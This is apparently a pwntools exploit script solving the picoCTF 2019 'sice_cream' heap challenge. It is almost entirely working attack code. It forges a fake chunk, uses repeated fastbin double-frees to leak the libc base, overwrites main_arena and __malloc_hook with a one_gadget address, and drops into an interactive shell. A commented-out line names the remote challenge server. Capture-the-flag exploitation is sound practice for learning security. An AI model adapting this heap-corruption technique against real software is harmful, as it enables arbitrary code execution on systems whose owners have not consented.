from pwn import *

e = ELF("./sice_cream")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
#p = remote("2019shell1.picoctf.com", 38495)

#context.log_level="debug"
gdb.attach(p, """set follow-fork-mode child \n c""")


name_var = 0x602040
ptr_arr = 0x602140
read_addr = 0x400cc4


def create(size, dat):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(size))
    p.sendafter("> ", dat)


def remove(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("> ", str(idx))


def reintroduce(dat):
    p.sendlineafter("> ", "3")
    p.sendafter("> ", dat)




p.sendafter("> ", "\x00"*8 + "\x21")


create(20, "A")
create(20, "B")


remove(0)
remove(1)
remove(0)


print("name var", hex(name_var))

create(20, p64(name_var))

create(20, "D")
create(20, "E")


create(20, "F")
reintroduce(p64(0) + p64(0x91) + "\x00"*0x80 + p64(0) + p64(0x41) + "\x00"*0x30 + p64(0x40) + p64(0x61))

remove(5)

reintroduce("A"*15 + "|")

p.recvuntil("|")

libc.address = u64(p.recv(6).ljust(8, "\x00")) - 0x3c4b78

print("libc address", hex(libc.address))
print("libc main arena", hex(libc.sym["main_arena"]))
print("libc system", hex(libc.sym["system"]))
print("libc malloc hook", hex(libc.sym["__malloc_hook"]))
print("libc free hook", hex(libc.sym["__free_hook"]))


reintroduce(p64(0) + p64(0x91))

remove(0)


create(0x40, "G") #6
create(0x40, "H")


remove(6)
remove(7)
remove(6)


create(0x40, p64(0x61))

create(0x40, "J")
create(0x40, "K")




create(0x50, "L") # 11
create(0x50, "M")

remove(11)
remove(12)
remove(11)

create(0x50, p64(libc.sym["main_arena"]+24))

create(0x50, "O") # 14
create(0x50, "P")

create(0x50, p64(0)*6 + p64(libc.sym["__malloc_hook"]-0x10))


create(0x50, p64(libc.address + 0xf02a4))


# oh my GOD this is SO annoYING BECAUSE IT DOESN'T WORK ON MY MACHINE BUT IT WORKS ON REMOTE

remove(1)
remove(1)


p.interactive()






